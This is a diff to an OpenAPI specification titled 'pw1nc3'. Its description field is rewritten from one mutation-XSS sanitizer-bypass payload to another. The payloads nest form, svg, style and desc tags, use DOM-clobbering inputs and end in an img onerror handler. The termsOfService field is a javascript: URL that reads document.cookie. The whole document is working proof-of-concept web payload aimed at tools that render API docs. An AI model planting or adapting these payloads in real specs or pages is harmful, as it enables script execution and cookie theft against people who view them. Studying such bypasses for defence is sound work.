@@ -7,21 +7,24 @@ info:
   version: "0.0.1"
   title: pw1nc3
 #  description: '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.cookie) src>">'
-  description: '<div*200>
-<form><input name="parentNode">
-<div*200>
-<form></form><form><input name="parentNode">
-<div*105>
-<table>
-  <caption>
-    <svg>
-      <desc>
-        <table><caption></caption></table>
-      </desc>
-      <style><a title="</svg></style><img src onerror=alert(1)>"></a></style>
-      </svg>
-  </caption>
-</table>'
+  description: '<form id="x ">
+<r*504>
+<a>
+  <svg>
+    <image>
+      <a>
+        <desc>
+          <svg>
+            <image></image>
+          </svg>
+        </desc>
+      </a>
+    </image>
+    <style><a id="</style><img src=x onerror=alert(1)>"></a></style>
+  </svg>
+</a>
+</form>
+<input form="x" name="__depth">'
   termsOfService: "javascript:alert(document.cookie)"
 paths:
   /:
